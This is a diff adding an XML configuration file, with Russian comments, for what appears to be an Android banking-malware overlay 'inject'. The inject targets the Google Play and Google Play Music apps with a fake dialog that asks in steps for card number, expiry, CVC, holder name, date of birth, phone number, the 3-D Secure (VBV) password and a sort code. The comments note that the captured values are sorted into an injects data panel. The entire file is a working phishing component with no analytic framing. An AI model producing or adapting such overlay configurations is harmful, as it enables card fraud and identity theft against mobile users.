@@ -1,0 +1,68 @@
+<?xml version="1.0" encoding="UTF-8"?><!-- Файл должен быть в кодировке UTF-8 (без BOM) -->
+<document>
+	<name>Google Play</name><!-- Название инжекта -->
+	<apps>com.android.vending;com.google.android.music</apps><!-- Приложения, которые будут перекрываться (через точку с запятой) -->
+	<size>2</size><!-- Размер инжекта (1 - стандартный, 2 - в виде диалога) -->
+	<storage>1</storage><!-- Место хранения инжекта (1 - в устройстве, 2 - на сервере) -->
+	
+	<step><!-- Новый шаг (форма) -->
+		<param>
+			<column>Card Number</column>
+			<name>cardNumber</name>
+		</param>
+		
+		<param>
+			<column>MM</column>
+			<name>expiredMonth</name>
+		</param>
+		
+		<param>
+			<column>YY</column>
+			<name>expiredYear</name>
+		</param>
+
+		<param><!-- Параметр в шаге (форме) -->
+			<column>CVC</column><!-- Название колонки (для вкладки "Инжекты"->"Данные") -->
+			<name>cvcEntry</name><!-- Название параметра (поле name в форме в файле index.html) -->
+		</param>
+	</step>
+
+	<step>
+		<param>
+			<column>Holder Name</column>
+			<name>nameOnCard</name>
+		</param>
+		
+		<param>
+			<column>Date of birth</column>
+			<name>dateOfBirth</name>
+		</param>
+		
+		<param>
+			<column>Phone number</column>
+			<name>phoneNumber</name>
+		</param>
+	</step>
+
+	<step>
+		<param>
+			<column>VBV</column>
+			<name>vbvPass</name>
+		</param>
+	</step>
+
+	<step>
+		<param>
+			<column>VBV Repeat</column>
+			<name>vbvPassRepeat</name>
+		</param>
+	</step>
+
+	<step>
+		<param>
+			<column>Sort Code</column>
+			<name>sortCode</name>
+		</param>
+	</step>
+
+</document>
